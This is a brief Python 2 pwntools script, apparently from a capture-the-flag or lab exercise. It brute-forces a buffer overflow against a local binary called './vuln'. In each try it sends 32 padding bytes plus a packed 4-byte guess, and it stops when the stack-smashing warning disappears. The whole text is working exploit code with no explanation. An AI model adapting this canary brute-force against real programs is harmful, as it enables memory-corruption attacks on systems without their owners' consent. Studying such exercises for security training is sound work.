from pwn import *

for i in range(0, 0x7FFFFFFF):
    p = process('./vuln')
    print p.recvuntil('>')
    p.sendline(32)
    print p.recvuntil('>')
    p.sendline('A'*32+p32(i))
    a = p.recvall()
    print a
    if '***' not in a:
        print('this is it', i)
        break;
    p.kill()
